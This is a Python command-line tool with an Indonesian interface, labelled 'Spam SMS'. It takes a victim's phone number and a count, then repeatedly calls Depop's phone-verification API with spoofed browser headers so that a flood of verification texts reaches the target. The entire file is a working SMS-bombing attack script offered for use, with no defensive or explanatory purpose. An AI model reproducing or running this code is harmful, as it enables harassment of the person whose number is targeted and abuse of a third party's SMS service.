import requests,json,os,time
from requests import put
import subprocess

def lagi():
    f = input("Coba Lagi? (y/t): ")
    if f == "y":
       subprocess.call("python sms.py",shell=True)
    else:
       os.system("clear")
       print("Terima Kasih Sudah Menggunakan Tools Ini :)")
       time.sleep(3)

banner="""
\tSpam SMS
\t__________


[•] Author   : Emwe56
[•] Instagram: nano._.emwe
[•] Tools    : Spam SMS (Python)
"""
os.system("clear")
print(banner)
print
print
nama=input("Siapa Nama Kamu?: ")
os.system("clear")
print(banner)
print("Hello ",nama)
print
print
nomor=input("Nomor: ")
jumlah=int(input("Jumlah: "))
print
headers={
"Host":"webapi.depop.com",
"content-length":"50",
"accept":"application/json, text/plain, */*",
"save-data":"on",
"user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome",
"content-type":"application/json",
"origin":"https://signup.depop.com",
"sec-fetch-site":"same-site",
"sec-fetch-mode":"cors",
"sec-fetch-dest":"empty",
"referer":"https://signup.depop.com/",
"accept-encoding":"gzip, deflate, br",
"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
}
data={
"phone_number":nomor,
"country_code":"ID"
}
for i in range(int(jumlah)):
    respon=requests.put("https://webapi.depop.com/api/v1/auth/verify/phone",headers=headers,json=data)
    sanz=json.loads(respon.text)
    if sanz['is_verified']==False:
         print("Spam SMS Berhasil")
    else:
         print("Spam SMS Gagal")
lagi()
